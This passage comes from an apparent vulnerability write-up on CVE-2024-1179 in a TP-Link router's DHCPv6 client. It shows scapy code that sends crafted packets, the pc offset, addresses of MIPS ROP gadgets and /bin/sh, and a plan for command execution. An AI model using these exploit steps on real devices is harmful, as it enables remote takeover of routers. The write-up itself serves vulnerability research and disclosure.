      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h2>
<h3 id="get-control-over-program-counter-pc">Get control over program counter (pc)<a href="#get-control-over-program-counter-pc" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h3>
<p>Now let&rsquo;s check the protection in place:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030164015.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Canary is disabled so we can freely overwrite a return address. No PIE (Position Independent Executable) means that the binary load address is known and is fixed for all execution. No RELRO (RElocation Read-Only) means that the GOT(Global Offset Table is writable). NX(Non eXecutable) is enabled means that the stack is not executable i.e. we cannot just put a shellcode on the stack and jump to it. Let&rsquo;s check if ASLR (Address Space Layout Randomization) is enabled.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241101114604.png"/><figcaption><h4> </h4></figcaption></figure>
<p>A value of <code>2</code> means that full ASLR is enabled, which means that the base addresses of the stack, heap, and libraries are randomized for each execution and we could not easily guess them.
With all this setup, to successfully exploit this binary, we need to craft a ROP chain.</p>
<p>No let&rsquo;s go back to our function. We saw earlier that there is a crash, but the program counter <code>pc</code> is not already under our control. We also noticed that the crash occurs in the binary. This means that there is crash somewhere before the function returns and thus the control flow cannot yet be hijacked.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030164814.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Using the source code of the OPNsense Github project, let&rsquo;s revisit  the function where the crash occurs (<a href="https://github.com/opnsense/dhcp6c/blob/272dc411f4f19f46eb6ebf136c8d9a7a0837b1f4/dhcp6c.c#L1207"><code>client6_recv</code></a> function).</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030165432.png"/><figcaption><h4> </h4></figcaption></figure>
<p>From previous analysis, we know that <code>optinfo</code> is populated using the <code>memcpy</code> in the<code>dhcp6_get_options</code> functions and <code>optinfo</code> is a struct on the stack. This is the buffer that is overflown. Let&rsquo;s check what other variables are overwritten by this overflow.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030165657.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Let&rsquo;s now take a look at what happens when the <code>dhcp6_get_options</code> succeeds.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030165902.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We can quickly find out why the program crashes earlier before the function returns. Indeed, our payload overwrote the stack variables located after <code>optinfo</code>,  especially the <code>dh6</code> variable which is used in the <code>switch case</code> that follows the call to <code>dhcp6_get_options</code>.  We need to avoid this crash.
The first approach we can take to avoid it is to write a valid pointer into the <code>dh6</code> so that when the programs tries to read <code>dh6-&gt;dh6_msgtype</code> it works and then write a <code>msgtype</code> which will let us go to the default case to avoid using our corrupted <code>dh6</code> (the default case only use the <code>dh6-&gt;dh6_msgtype</code> to retrieve the message string to print).
The second approach is more quick and straightforward and we don&rsquo;t need to deal with shenanigans pointer. We can see that if <code>dhcp6_get_options</code> return value is less than <code>0</code> (<code>dhcp6_get_options</code> fails to properly parse an option) the function immediately returns. So we just need to find a way to craft an invalid option that will return a value less than <code>0</code>. This will make the function return without crashing. Then, when returning, the saved return address will be popped from the stack. As this value was overwritten with our payload,  we will now have control of the program counter <code>pc</code>.
Let&rsquo;s revisit the <a href="https://github.com/opnsense/dhcp6c/blob/272dc411f4f19f46eb6ebf136c8d9a7a0837b1f4/common.c#L1502"><code>dhcp6_get_options function</code></a> to see how to construct an invalid options. We can see that for some options, when there is error in the handling, we <code>goto fail</code> or <code>goto malformed</code> and return <code>-1</code> which is less than <code>0</code>.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030174748.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Let&rsquo;s now find a simple DHCPv6 option that we can quickly make invalid option.
The <code>RAPID_COMMIT</code> option is simple and perfect for our need:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> DH6OPT_RAPID_COMMIT:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (optlen <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> malformed;
</span></span><span style="display:flex;"><span>			optinfo<span style="color:#f92672">-&gt;</span>rapidcommit <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
</span></span></code></pre></div><p>By providing an <code>optlen</code> that is not <code>0</code> , we will go to the malformed label and return <code>-1</code>
Let&rsquo;s use this in our python script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># 14=0xe = RAPID_COMMIT, normally len should be 0, but we want to trigger an error so voila</span>
</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x0e</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>rapid_commit_option <span style="color:#f92672">=</span> code <span style="color:#f92672">+</span> (len(payload))<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">2</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Combine all layers and send packet</span>
</span></span><span style="display:flex;"><span>pck <span style="color:#f92672">=</span> ethernet_layer <span style="color:#f92672">/</span> ipv6_layer <span style="color:#f92672">/</span> udp_layer <span style="color:#f92672">/</span> dhcp6_advertise <span style="color:#f92672">/</span> server_id <span style="color:#f92672">/</span> client_id <span style="color:#f92672">/</span> aftr_name_option <span style="color:#f92672">/</span> rapid_commit_option
</span></span><span style="display:flex;"><span>print(pck)
</span></span><span style="display:flex;"><span>sendp(pck, iface<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;br0&#34;</span>, verbose<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><p>We then restart the binary with the <code>gdbserver</code>. In Wireshark we can see that we successfully sent <code>RAPID_COMMIT</code> with <code>len = 1 != 0</code>.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030180617.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Shortly, we have the segfault in GDB.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030180452.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We can see that we now have control over <code>pc</code>. Now we need to find the offset to <code>pc</code> to build our ROP chain from there. Let&rsquo;s use pwntools De Bruijn sequence generator. As we now know how everything work for <code>AFTR_NAME</code> options and that this program doesn&rsquo;t check everything properly, we don&rsquo;t need anymore to be RFC compliant, we can then use the sequence directly as payload like below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">500</span>)
</span></span><span style="display:flex;"><span>aftr_name_option <span style="color:#f92672">=</span> code <span style="color:#f92672">+</span> (len(payload))<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">2</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> payload
</span></span></code></pre></div><p>And in GDB:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030182028.png"/><figcaption><h4> </h4></figcaption></figure>
<p><code>pc</code> is at offset <code>421=0x1a5</code>. We can now start thinking about how to build our ROP chain.</p>
<h3 id="build-the-rop-chain">Build the ROP chain<a href="#build-the-rop-chain" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h3>
<p>We need to construct a ROP chain that will allow us to execute commands on the router. Sometimes in this kind of binary there can exist a quick win gadgets that could directly allow us to execute command. To find such gadget, we can cross reference the function <code>system</code> or <code>execve</code> (or similar function) and search for function which use them. May be there is one awaiting us to fill our command in first argument. But in our case we didn&rsquo;t find any such function.
However by cross-referencing <code>exceve</code>, we found a gadget that looks promising.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031021118.png"/><figcaption><h4> </h4></figcaption></figure>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>i <span style="color:#ae81ff">0x40a8b6</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8b7</span><span style="color:#f92672">:</span>	lw	a2,<span style="color:#ae81ff">56</span>(sp)
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8b9</span><span style="color:#f92672">:</span>	lw	a0,<span style="color:#ae81ff">136</span>(sp)
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8bb</span><span style="color:#f92672">:</span>	jal	<span style="color:#ae81ff">0x419211</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8bf</span><span style="color:#f92672">:</span>	addiu	a1,sp,<span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8c1</span><span style="color:#f92672">:</span>	jal	<span style="color:#ae81ff">0x4196e1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8c5</span><span style="color:#f92672">:</span>	nop
</span></span></code></pre></div><p>As we can see, <code>a0</code>, and <code>a2</code> are loaded using a fixed offset from <code>sp(stack pointer)</code> register which content is under our control. This means that we can control what is loaded into <code>a0</code> and <code>a2</code>. Also a stack address is loaded into <code>a1</code>, so we can control the content of this pointer. We also find the <code>/bin/sh</code> string in the binary at fixed location <code>0x0041317c</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Searching <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sh<span style="color:#960050;background-color:#1e0010">&#39;</span> in whole memory
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] In <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>dhcp6c<span style="color:#960050;background-color:#1e0010">&#39;</span> (<span style="color:#ae81ff">0x400000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x41a000</span> [r<span style="color:#f92672">-</span>x])
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0041317c</span><span style="color:#f92672">:</span>    <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">6</span>e <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">3</span>d <span style="color:#ae81ff">3</span>d    <span style="color:#f92672">|</span>  <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sh.echo <span style="color:#e6db74">&#34;==  |</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] In <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libc.so<span style="color:#960050;background-color:#1e0010">&#39;</span> (<span style="color:#ae81ff">0x77f5b000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x77fed000</span> [r<span style="color:#f92672">-</span>x])
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x77fe8cac</span><span style="color:#f92672">:</span>    <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">6</span>e <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">0</span>a  <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">6</span>e <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">68</span>    <span style="color:#f92672">|</span>  <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sh.<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>csh  <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x77feaad8</span><span style="color:#f92672">:</span>    <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">6</span>e <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">2f</span> <span style="color:#ae81ff">64</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">76</span>    <span style="color:#f92672">|</span>  <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sh.r...<span style="color:#f92672">/</span>dev  <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Searching <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">\</span>x00b<span style="color:#960050;background-color:#1e0010">\</span>x00i<span style="color:#960050;background-color:#1e0010">\</span>x00n<span style="color:#960050;background-color:#1e0010">\</span>x00<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">\</span>x00s<span style="color:#960050;background-color:#1e0010">\</span>x00h<span style="color:#960050;background-color:#1e0010">\</span>x00<span style="color:#960050;background-color:#1e0010">&#39;</span> in whole memory
</span></span></code></pre></div><p>So to properly call this <code>execve</code> gadget <code>a0 (char *path)</code> will be the address of <code>/bin/sh</code> strings and <code>a2 (char *envp[])</code> will be set to <code>NULL</code>. <code>a1 (char *argv[])</code> will be a pointer to our command strings pointer arrays (<code>['/bin/sh', '-c', 'ls', NULL]</code>).  From our gadget, we understand that <code>a1</code> will be a stack pointer, and we will need to craft our command strings pointers there. However, imagine if we write <code>ls</code> and <code>-c</code> in the stack in order to craft our pointers, we will need to know the location of the strings we wrote.</p>
<p>At first glance, we notice that even though <code>/proc/sys/kernel/randomize_va_space</code> content is 2, the stack is always loaded from the same address. That is the same for libraries. They are always at same address across execution. This means there is no ASLR and we can easily find where the command strings is written. We were so confused at this step. Why does the ASLR seem disabled even though the kernel configuration says it is enabled ? Furthermore <a href="https://www.zerodayinitiative.com/advisories/ZDI-24-502/">CVE-2024-5243</a> exploit the same router with same vulnerable firmware version. In this <a href="https://claroty.com/team82/research/pwn2own-wan-to-lan-exploit-showcase">blog post</a>, they explain how they manage to get a code execution on this router with this version of firmware. We can see indeed that to bypass mitigations like ASLR, they use another <a href="https://claroty.com/team82/disclosure-dashboard/cve-2024-5244">CVE-2024-5244</a>.</p>
<pre tabindex="0"><code>Our plan for successful exploitation and remote code execution was to create a ROP chain (return-oriented programming) that leads to a `system (COMMAND)`. The problem we faced is address space layout randomization (ASLR); we could not guess the base addresses of the stack/heap/libs and needed to find a way to leak them in order to defeat ASLR, a mitigation in many operating systems against memory-based code-execution attacks.
</code></pre><p>This was so confusing. The question is why do they need another CVE to leak the address if the address was already known ? Is our qemu setup causing the ASLR problem ?
As we don&rsquo;t have the router in hand we can&rsquo;t confirm if ALSR is effectively enabled or not.</p>
<p>But let&rsquo;s consider that ASLR is enabled and we cannot guess the address of stack, heap, libraries etc&hellip;</p>
<p>As we cannot guess where the stack is at runtime, we cannot used the previous <code>execve</code>gadgets directly. We need a way to write to a known address. We noticed that there is a <code>rw</code> region in the binary, starting from <code>0x42a000</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> vmmap
</span></span><span style="display:flex;"><span>[ Legend:  Code <span style="color:#f92672">|</span> Heap <span style="color:#f92672">|</span> Stack <span style="color:#f92672">|</span> Writable <span style="color:#f92672">|</span> ReadOnly <span style="color:#f92672">|</span> None <span style="color:#f92672">|</span> RWX ]
</span></span><span style="display:flex;"><span>Start      End        Size       Offset     Perm Path
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00400000</span> <span style="color:#ae81ff">0x0041a000</span> <span style="color:#ae81ff">0x0001a000</span> <span style="color:#ae81ff">0x00000000</span> r<span style="color:#f92672">-</span>x <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>dhcp6c  <span style="color:#f92672">&lt;-</span>  <span style="color:#960050;background-color:#1e0010">$</span>s3
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0042a000</span> <span style="color:#ae81ff">0x0042b000</span> <span style="color:#ae81ff">0x00001000</span> <span style="color:#ae81ff">0x0001a000</span> rw<span style="color:#f92672">-</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>dhcp6c
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0042b000</span> <span style="color:#ae81ff">0x00481000</span> <span style="color:#ae81ff">0x00056000</span> <span style="color:#ae81ff">0x00000000</span> rwx [heap]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77df3000</span> <span style="color:#ae81ff">0x77e0c000</span> <span style="color:#ae81ff">0x00019000</span> <span style="color:#ae81ff">0x00000000</span> r<span style="color:#f92672">-</span>x <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libeasylogger.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77e0c000</span> <span style="color:#ae81ff">0x77e0d000</span> <span style="color:#ae81ff">0x00001000</span> <span style="color:#ae81ff">0x00009000</span> rw<span style="color:#f92672">-</span> <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libeasylogger.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77e0d000</span> <span style="color:#ae81ff">0x77e12000</span> <span style="color:#ae81ff">0x00005000</span> <span style="color:#ae81ff">0x00000000</span> rw<span style="color:#f92672">-</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77e12000</span> <span style="color:#ae81ff">0x77e27000</span> <span style="color:#ae81ff">0x00015000</span> <span style="color:#ae81ff">0x00000000</span> r<span style="color:#f92672">-</span>x <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libubox.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77e27000</span> <span style="color:#ae81ff">0x77e28000</span> <span style="color:#ae81ff">0x00001000</span> <span style="color:#ae81ff">0x00005000</span> rw<span style="color:#f92672">-</span> <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libubox.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77e28000</span> <span style="color:#ae81ff">0x77f0f000</span> <span style="color:#ae81ff">0x000e7000</span> <span style="color:#ae81ff">0x00000000</span> r<span style="color:#f92672">-</span>x <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libiconv.so<span style="color:#ae81ff">.2.4.0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77f0f000</span> <span style="color:#ae81ff">0x77f10000</span> <span style="color:#ae81ff">0x00001000</span> <span style="color:#ae81ff">0x000d7000</span> rw<span style="color:#f92672">-</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libiconv.so<span style="color:#ae81ff">.2.4.0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77f10000</span> <span style="color:#ae81ff">0x77f26000</span> <span style="color:#ae81ff">0x00016000</span> <span style="color:#ae81ff">0x00000000</span> r<span style="color:#f92672">-</span>x <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libuci.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77f26000</span> <span style="color:#ae81ff">0x77f27000</span> <span style="color:#ae81ff">0x00001000</span> <span style="color:#ae81ff">0x00006000</span> rw<span style="color:#f92672">-</span> <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libuci.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77f27000</span> <span style="color:#ae81ff">0x77f49000</span> <span style="color:#ae81ff">0x00022000</span> <span style="color:#ae81ff">0x00000000</span> r<span style="color:#f92672">-</span>x <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libgcc_s.so<span style="color:#ae81ff">.1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77f49000</span> <span style="color:#ae81ff">0x77f4a000</span> <span style="color:#ae81ff">0x00001000</span> <span style="color:#ae81ff">0x00012000</span> rw<span style="color:#f92672">-</span> <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libgcc_s.so<span style="color:#ae81ff">.1</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77f4a000</span> <span style="color:#ae81ff">0x77f5a000</span> <span style="color:#ae81ff">0x00010000</span> <span style="color:#ae81ff">0x00000000</span> r<span style="color:#f92672">-</span>x <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>liblogger.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77f5a000</span> <span style="color:#ae81ff">0x77f5b000</span> <span style="color:#ae81ff">0x00001000</span> <span style="color:#ae81ff">0x00000000</span> rw<span style="color:#f92672">-</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>liblogger.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77f5b000</span> <span style="color:#ae81ff">0x77fed000</span> <span style="color:#ae81ff">0x00092000</span> <span style="color:#ae81ff">0x00000000</span> r<span style="color:#f92672">-</span>x <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libc.so  <span style="color:#f92672">&lt;-</span>  <span style="color:#960050;background-color:#1e0010">$</span>t9
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77ffc000</span> <span style="color:#ae81ff">0x77ffe000</span> <span style="color:#ae81ff">0x00002000</span> <span style="color:#ae81ff">0x00091000</span> rw<span style="color:#f92672">-</span> <span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>libc.so
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x77ffe000</span> <span style="color:#ae81ff">0x78000000</span> <span style="color:#ae81ff">0x00002000</span> <span style="color:#ae81ff">0x00000000</span> rwx   <span style="color:#f92672">&lt;-</span>  <span style="color:#960050;background-color:#1e0010">$</span>s6, <span style="color:#960050;background-color:#1e0010">$</span>s7
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x7ffde000</span> <span style="color:#ae81ff">0x7ffff000</span> <span style="color:#ae81ff">0x00021000</span> <span style="color:#ae81ff">0x00000000</span> rw<span style="color:#f92672">-</span> [stack]  <span style="color:#f92672">&lt;-</span>  <span style="color:#960050;background-color:#1e0010">$</span>a1, <span style="color:#960050;background-color:#1e0010">$</span>sp, <span style="color:#960050;background-color:#1e0010">$</span>fp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x7ffff000</span> <span style="color:#ae81ff">0x80000000</span> <span style="color:#ae81ff">0x00001000</span> <span style="color:#ae81ff">0x00000000</span> r<span style="color:#f92672">-</span>x [vdso]
</span></span></code></pre></div><p>But if we inspect the start of this region, it seems that it&rsquo;s the <code>GOT</code> regions. We can see it in Ghidra and GDB shows us many libc addresses when we inspect these regions.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031140224.png"/><figcaption><h4> </h4></figcaption></figure>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031140434.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We also confirm this through dynamic analysis. We will not overwrite these addresses to avoid creating a mess. Starting from <code>0x42a600</code> we can see a lot of null bytes. So we can write there.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031140750.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Now we need to find a gadget that will allow us to write our command strings to an address.
ROPgadget or ropper tools didn&rsquo;t help us a lot.</p>
<p>We then came across a great idea. If we could find a gadget that uses <code>strcpy</code> with the destination address that we can control and with source address that is a stack address with a content we  control, it would be great. To find this gadgets, we start by cross-referencig <code>strcpy</code> in the binary. This one looks promising:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031040446.png"/><figcaption><h4> </h4></figcaption></figure>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>i <span style="color:#ae81ff">0x40c4ac</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c4ad</span><span style="color:#f92672">:</span>	li	v0,<span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c4af</span><span style="color:#f92672">:</span>	lw	a0,<span style="color:#ae81ff">132</span>(sp)
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c4b1</span><span style="color:#f92672">:</span>	addiu	a1,sp,<span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c4b3</span><span style="color:#f92672">:</span>	jal	<span style="color:#ae81ff">0x419131</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c4b7</span><span style="color:#f92672">:</span>	sb	v0,<span style="color:#ae81ff">0</span>(s1)
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c4b9</span><span style="color:#f92672">:</span>	restore	<span style="color:#ae81ff">128</span>,ra,s0<span style="color:#f92672">-</span>s1
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c4bb</span><span style="color:#f92672">:</span>	jrc	ra
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c4bd</span><span style="color:#f92672">:</span>	sltiu	a2,<span style="color:#ae81ff">112</span>
</span></span></code></pre></div><p>Indeed, this gadget loads <code>a0</code> (the destination) from stack offset, then loads the source <code>a1</code>(<code>sb	v0,0(s1)</code> executed with the branch delay slots mechanism) using a stack pointer pointing to a value we control. The only downside of this is that at the end, the stack pointer will be increased by <code>128</code>  (<code>restore	128,ra,s0-s1</code>). As we want to chain gadgets, we hope that there will be other data that we controlled at this new stack pointer location.
Let&rsquo;s now modify our script accordingly by adding the following into the <code>send_dhcp6_advertise</code> function and adjusting our stack value and offset accordingly (We almost use the pwntools <code>cyclic</code> to find the offset).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0041317c</span>
